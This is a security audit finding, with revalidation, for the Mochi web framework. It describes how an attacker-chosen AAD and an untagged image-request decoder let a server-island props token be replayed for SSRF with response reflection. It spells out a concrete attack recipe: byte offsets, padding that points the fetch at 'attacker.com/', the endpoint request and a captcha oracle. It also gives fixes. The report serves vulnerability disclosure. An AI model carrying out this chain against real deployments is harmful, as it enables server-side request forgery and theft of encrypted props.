# [HIGH] Untagged image-request decoder + attacker-chosen AAD lets a server-island props token be replayed as an image request (SSRF with response reflection)

**File:** [`packages/mochi/src/image/imageCodec.ts`](https://github.com/khromov/mochi/blob/main/packages/mochi/src/image/imageCodec.ts#L85-L105) (lines 85, 90, 95, 104, 105)
**Project:** mochi
**Severity:** HIGH  •  **Confidence:** high  •  **Slug:** `other-aad-confusion`

## Owners

**Suggested assignee:** `stanislav.khromov+github@gmail.com` _(via last-committer)_

## Finding

All sealed tokens in Mochi share one derived AES-256-SIV key (`payloadCrypto.ts:38-44`, HMAC-SHA512(secretKey,'mochi-payload-aes-siv-v1')); the only domain separation is the `aad`. Two defects combine to collapse it.

(1) The image endpoint's AAD is wholly attacker-chosen. `imageEndpoint.ts:74` does `const filename = url.pathname.split('/').pop() ?? ''` and passes it unvalidated to `decryptImageRequest(token, filename)` (L82) under route `/_mochi/image/:filename` (`Mochi.ts:1707`), which is mounted by DEFAULT (`image.enabled ?? true`) as a raw Bun route — no CSRF, no rate limit, no protection gate. So an attacker can ask the server to open ANY payload-crypto token under ANY single-path-segment AAD.

(2) `unpackImageRequest` (L85-118) has no magic byte, version, or type tag. It accepts arbitrary bytes: `control = buf[0]` (L90), an optional size name, and `src = prefix + rest` (L103-105). A foreign plaintext therefore decodes into a syntactically valid `ImageRequest` instead of failing closed.

Attack chain (all inputs are published in the page HTML): a `mochi:defer` server island renders `<mochi-server-island component-name="Hero_1a2b3c" signed-props="<base64url token>">` (`svelteAstPreprocess.ts:300,318`), where the token is `encryptPayload(devalue(props), {aad: islandKey})` and `islandKey` is `<Name>_<hash>` — a valid URL path segment. Request `/_mochi/image/Hero_1a2b3c?p=<signed-props token>`. The AAD matches, decryption succeeds, and the devalue props JSON is reinterpreted: devalue output begins `[{`, so `control = 0x5B` = ORIGINAL|HAS_SIZE|HTTP_PREFIX and `nameLen = byte1 = 0x7B = 123`, leaving `src = 'http://' + propsJson.slice(125)`. `getSize()` misses on the 123-byte garbage name, so execution takes the `!size` original path (`imageEndpoint.ts:94-114`) and calls `getCachedOriginal(request.src, …)` → `fetchImageSource` → fetch → **the fetched body is returned to the attacker** (and cached on disk for `timeToEvict`).

Impact: if the island receives even one attacker-influenced string prop, the attacker pads it so byte 125 begins a hostname of their choosing (the offset is deterministic and brute-forceable in a few hundred requests), giving server-side request forgery with full response reflection served from the victim's own origin. `allowedHosts` defaults to `undefined` (any public host) and an app with `image.blockPrivateNetworks: false` (as `packages/site` sets) gets internal-network reach. Inserting a `/` in their own padding puts the remainder of the plaintext — including props the client was never meant to read, which is the entire reason `encryptProps` exists — into the request path, exfiltrating it to the attacker's access log. Separately, `imageEndpoint.ts:88-90` passes the 123 garbage bytes to `warnUnknownSize()`, writing foreign plaintext verbatim into the application log and growing the never-evicted module-level `warnedUnknownSize` Set once per distinct replayed token (log injection + unbounded memory growth).

Even with no controllable prop, this is an unauthenticated, unrate-limited validity oracle for every other token type: `PROTECTION_AAD = 'mochi-protection'` and `CAPTCHA_AAD = 'mochi-captcha'` are both single path segments, so `/_mochi/image/mochi-captcha?p=<token>` returns 400 ('Invalid source URL') for a genuine token versus 403 ('Invalid payload') otherwise — defeating the captcha's deliberate single-generic-error design and the `authFailureDelay` tarpit.

## Recommendation

Fail closed on foreign payloads: (a) prefix a purpose/version tag into the AAD at each call site (`aad: 'mochi-image-v1:' + filename` in `imageCrypto.ts`, `'mochi-island-v1:' + componentName` in `serverIslandCrypto.ts`, etc.), or better, derive a distinct key per purpose by varying the HMAC label in `sivKey()`; (b) add a magic/version byte to `packImageRequest`/`unpackImageRequest` and reject anything that doesn't carry it; (c) validate the filename at `imageEndpoint.ts:74` against the shape the minter actually produces (`/^[a-z0-9-]{1,80}\.[a-z0-9]{1,5}$/`) before using it as AAD; (d) stop logging the decoded size name verbatim and bound `warnedUnknownSize`.

## Revalidation

**Verdict:** true-positive

I traced the whole chain and every link holds at HEAD. (1) The route: `Mochi.ts:1707` registers `${assetPrefix}/image/:filename` directly into `bunRoutes` via `withHead(...)`. Bun dispatches `routes` before `fetch`, and `buildRequestContext` is never called, so there is no `checkRouteLimit`, no `csrfCheck`, no `protection` gate (confirmed: `protectionRuntime.gate` is only wired into `publicRouteGuard` at Mochi.ts:1845 and the fetch fallback at 1898) and no `KIND_POLICY` entry — `RouteKind` has no `image` member at all. It is mounted by default (`enabled: o.enabled ?? true`). (2) The AAD is wholly attacker-chosen: `imageEndpoint.ts:74` is `url.pathname.split('/').pop() ?? ''` with zero validation, handed straight to `decryptImageRequest(token, filename)` (L82), which passes it as `aad` to `decryptPayloadBytes`. (3) One key for everything: `payloadCrypto.sivKey()` is `HMAC-SHA512(secretKey, 'mochi-payload-aes-siv-v1')` memoized per secret — image requests, island props, captcha and clearance all use it, and the AAD string is the only domain separator. (4) `unpackImageRequest` has no magic/version/type tag; it reads `control = buf[0]` and otherwise returns a request for essentially any byte string. (5) The island side matches: `svelteAstPreprocess.ts` (both the visible and non-visible defer branches) emits `component-name="${islandKey}" signed-props={__mochi_encrypt_props__(__mochi_stringify__(envelope), "islandKey")}`, and `islandIdentity()` guarantees `islandKey` is `<Name>_<base36 hash>` — a bare `\w+` token, i.e. a legal single path segment. `shouldInlineIsland()` returns false on an ordinary page render, so the placeholder with `signed-props` really does land in the HTML. (6) `stringify` is devalue's (`mochi-framework.d.ts` re-exports it); I read `node_modules/devalue/src/stringify.js` and confirmed an object root serializes as `[{"k":1,...},"v1",...]`, so byte 0 = 0x5B (= ORIGINAL|HAS_SIZE|HTTP_PREFIX — 91 has bits 0,1,3 set and bit 2 clear) and byte 1 = 0x7B = 123, making `nameLen` 123 and `src = 'http://' + plaintext.slice(125)` exactly as described. Because `original` is set, `getSize` is skipped, `getCachedOriginal(src)` runs, and the upstream bytes are returned in the response body (lines 96-114) — `safeOriginalContentType` only forces `application/octet-stream`/`attachment` for non-raster types, it does not withhold the bytes. Concrete self-service attack on a default config: an app with `<Child mochi:defer query={q} />` where `q` comes from the query string; the envelope devalues to `[{"query":1,"islandId":2},"<USER>","s1-0"]`, putting the user string's first byte at offset 27, so `?q=` + 98 filler chars + `attacker.com/` places the host at offset 125. The attacker loads that page themselves, copies `signed-props` out of their own HTML, and GETs `/_mochi/image/<islandKey>?p=<token>` — the server fetches `http://attacker.com/<remainder of the sealed plaintext>` and hands the response body back. `allowedHosts` defaults to undefined so any public host is reachable; deflate compression is transparent (inflate restores the exact plaintext); the offset is deterministic and trivially binary-searched off the 400-vs-403 difference. That breaks two guarantees the project states explicitly: `packages/docs/148-images.md` line 17 ("an attacker cannot request arbitrary sources or transforms") and the Callout at ~line 92 that recommends `mochi:defer` precisely because its props are encrypted — the tail of the plaintext (later props) is exfiltrated into the attacker's access log. The ancillary claims also check out: `warnUnknownSize(request.size)` does fire (request.size is the 123-byte garbage, `size` is undefined) and `warnedUnknownSize` is an unbounded module-level Set. The only sub-claim I had to correct is the clearance oracle: `PROTECTION_AAD` plaintext is `{"iat":...,"bits":N}` (~31 bytes), so `2 + 34 > 31` makes `unpackImageRequest` return null and the response is the same 403 as a failed decrypt — no oracle there. The captcha oracle does work (its plaintext is ~78 bytes, past the offset, so a genuine token yields 400 'Invalid source URL' vs 403 'Invalid payload'), though its practical value is low since the attacker is handed valid captcha tokens anyway. HIGH stands on the SSRF + response reflection + props exfiltration, which needs no authentication and no victim interaction.
